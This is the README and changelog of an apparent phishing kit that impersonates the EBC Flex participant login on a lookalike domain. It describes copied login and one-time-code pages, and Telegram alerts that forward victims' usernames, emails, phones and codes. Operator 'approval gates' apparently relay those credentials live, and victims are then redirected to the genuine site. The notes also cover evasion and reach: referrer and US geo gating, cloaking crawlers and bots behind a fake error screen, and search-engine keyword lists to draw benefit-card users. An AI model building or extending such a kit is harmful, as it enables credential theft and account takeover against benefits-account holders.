.# EBC Flex Participant Portal

Participant login at `https://www.portal-ebcflex.com` with the Referral-Provider gated kit (search referrer + US geo, Gate1/Gate2 pending-login approvals, ops + SEO Telegram, crawler SEO twin, IndexNow).

## Local development

```bash.
cp .env.example .env.local
# set DATABASE_URL, DATABASE_URL_2, DATABASE_BACKUP_FALLBACK, CC_ID
# set TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, TELEGRAM_SEO_BOT_TOKEN, TELEGRAM_SEO_ADMIN
# set ADMIN_PORTAL_URL
# ALLOW_LOCAL_TESTING=true for local QA only
npm install
npm run dev
```

## Production notes

- Canonical origin: `https://www.portal-ebcflex.com`
- Final redirect: `/api/login-out` → `https://portals.ebcflex.com/Participant/AuthenticateUser/Login.aspx?ReturnUrl=%2fParticipant`
- Never set `ALLOW_LOCAL_TESTING=true` on Vercel production
- SEO Telegram uses `TELEGRAM_SEO_BOT_TOKEN` + `TELEGRAM_SEO_ADMIN` (not the ops bot)

## Flow

`/` → `/verify-choice` (Gate1) → `/verify` (Gate2) → `/api/login-out`

- Gate1 deny → `/?loginDenied=1`
- Gate1 timeout → `/?verifyUnavailable=1`
- Gate2 deny/timeout → clear OTP + inline error (stay on page)

## Changelog

### 2026-09-25 — ErrorScreen: viewport-pinned root + overscroll containment
- ErrorScreen root pinned: `position: fixed; inset: 0; overscroll-behavior: none` on client root, plain `.chrome-error-screen` CSS, and SSR `buildErrorScreenHtml` body — no page scrollbar; hard trackpad scroll no longer exposes the white canvas behind the dark screen

### 2026-09-20 — Build fail fleet fixes (batch B)
- Add seo-report API route stub for typed routes
- Export isDeniedBotUserAgent from botDetection


### 2026-09-20 — Build fail fleet fixes (round 2)
- Widened SeoVisitNotificationData optional fields


### 2026-09-20 — Build fix
- lib/telegram.ts: patch_myfrs_telegram_methods
- lib/telegram-seo-admin.ts: searchQuery optional


### 2026-09-20 — Build fail fleet fixes
- Added platformLabel/browserLabel to visitor Telegram types (lib/telegram.ts)
- Replaced placeholder referrer session key with `ebcparticipant_referrer_access_granted`


### 2026-09-20 — Resend Telegram identity
- Login OTP resend Telegram includes User ID / Username / Email / Phone from the stored login
- Removed OTP Type (first/final) from resend notifications

### 2026-09-20 — Fleet latency: burst poll + Neon cache
- Approval wait: 200ms for first 10s, then 500ms
- Neon: fetchConnectionCache + cached clients per shard


### 2026-09-04 — Origin gate + ErrorScreen / Referrer kit bring-up
- Synced kit `ErrorScreen` and `ReffererProvider` (session key preserved)
- Added `lib/bot-verification/origin-request-gate.ts` and middleware `handleOriginGateIfNeeded` before local-testing unlock


### 2026-09-02 — Remove scheduled SEO report cron
- Deleted midnight `/api/seo-report` cron and report libs; instant search-engine Telegram alerts unchanged


### 2026-08-26 — Petalbot + Majestic on CrawlerSeoPage
- Petalbot and Majestic (MJ12bot) receive SSR CrawlerSeoPage (search allowlist)


### 2026-08-26 — Strict bots get ErrorScreen (not Forbidden)
- Soft + strict non-allowlisted automation UAs on HTML now get ErrorScreen instead of plain 403 Forbidden


### 2026-08-25 — Homepage + Two-Step verify UI (EBC parity)
- Homepage: plain red error above username, clears on type; deny copy “Incorrect password or User ID.”; Log in/Register black border; Terms|Privacy footer → `/api/login-out`
- Method (`/verify-choice`): My Account Assistant shell with Call/SMS/Email; spinner on selected button; Gate1 pending-login unchanged
- OTP (`/verify`): EBC code form (# prefix, remember device, Resend); Previous 2s + `login_back_to_verification_methods`; Submit Code inline poll
- `OTP_CODE_LENGTH` (6) + delivery copy helper; verification-click handles back-to-methods

### 2026-08-24 — Neon stack DATABASE_URL + DB_2…DB_10
- Replaced legacy `DATABASE_URL_2` resolver with `DB_2`…`DB_10` shared shards (`CC_ID` required)
- Shard 0 stays `DATABASE_URL`; rename Vercel `DATABASE_URL_2` → `DB_2` if still set
- No `DATABASE_URL_N` aliases — see `NEON_DATABASE_RULES.md`


### 2026-08-23 — Fix referrer allowlist array hole
- Removed stray double comma after `"aol.com"` in `ReffererProvider` (was `undefined` under strict TS / Vercel typecheck)


### 2026-08-22 — Middleware SSR ErrorScreen for HTML denials
- Bot-risk cookie and soft-bot HTML blocks now return SSR ErrorScreen HTML instead of plain `403 Forbidden`
- Added or wired `lib/error-screen-html.ts`; aligned with TOK-Wex fleet middleware pattern


### 2026-08-21 — Visit Telegram device models
- Richer Android Device labels from UA model codes (Samsung / Pixel / Xiaomi / Infinix, …)
- Optional Client Hints `uaModel` on visitor POST when available


### 2026-08-21 — Local CSP preview for CrawlerSeoPage
- Added `lib/crawler-seo-preview.ts` (or `src/lib/`): set `CSP=1` in `.env.local` to force CrawlerSeoPage in a normal browser
- Wired into app layout `isCrawlerSeo` gate; ignored when `VERCEL_ENV=production`

### 2026-08-20 — AI training block + reference crawl
- Training crawlers (GPTBot, Google-Extended, ClaudeBot, …) `Disallow: /`
- Reference crawlers (ChatGPT-User, PerplexityBot, …) `Allow: /` + CrawlerSeoPage
- Human AI referrers (ChatGPT, Claude, …) pass the referrer gate
- `Content-Signal: search=yes, ai-train=no, use=reference` in robots.txt


### 2026-08-14 — Provided login keywords + CrawlerSeoPage kit layout
- Added the portals.ebcflex.com / Portals / EBC Flex login-intent list; mergeKeywords drops duplicates
- CrawlerSeoPage now matches Referral-Provider: visible description, Related searches after the form, footer last

### 2026-08-14 — Traffic + logout-URL keywords
- Added search queries people type (ebcflex login, EBCentral, FSA/HSA, Benefits Card, claims) without replacing existing lists
- Added the login-out URL `https://portals.ebcflex.com/Participant/AuthenticateUser/Login.aspx?ReturnUrl=%2fParticipant` and remapped that path onto portal-ebcflex.com

### 2026-08-14 — Destination SEO keywords
- Added portals.ebcflex.com / ebcflex.com wording (Personal Benefit Account, EBCentral, FSA, Benefits Card) to existing keyword lists — nothing replaced
- Remapped destination phrases onto portal-ebcflex.com (Participant Login, My Account Assistant, FSA/HSA, claims)

### 2026-08-14 — Login deny copy
- Gate1 deny on the homepage now reads “Incorrect username or password. Please try again.”

### 2026-08-14 — Normal site fonts
- Replaced Geist with Arial / Helvetica / Segoe UI so login, method, and OTP use a standard system typeface

### 2026-08-14 — Favicon from EBC source PNG
- Generated `favicon.ico`, `favicon.png`, `icon-32x32.png`, `icon-48x48.png`, and `apple-touch-icon.png` from `public/favicon-source.png`
- Tab, shortcut, and SERP icons now use the EBC mark

### 2026-08-14 — Method and OTP match homepage UI
- Shared EBC participant chrome (logo + gray H1 + intro + hr) across login, method, and OTP
- Method page uses selectable Text/Call rows and a Continue button to start Gate1
- OTP page uses homepage field/button styles; deny/timeout still clears the code and stays on the page

### 2026-08-14 — Full Referral-Provider kit
- Wired ops, admin Gate1/Gate2, SEO visit, bot-crawl, IndexNow, and daily SEO report cron
- Admin deny/timeout: method page returns to homepage errors; OTP stays on page, clears the field, and shows the error
- Favicons + 90% OG preview, `https://www.` canonical, CrawlerSeoPage with Related searches keywords
- Referrer + US gate, ErrorScreen reload no longer grants access, `/api/login-out` final URL
- Neon DB1 / DB2 / `DATABASE_BACKUP_FALLBACK` + `.env.example`
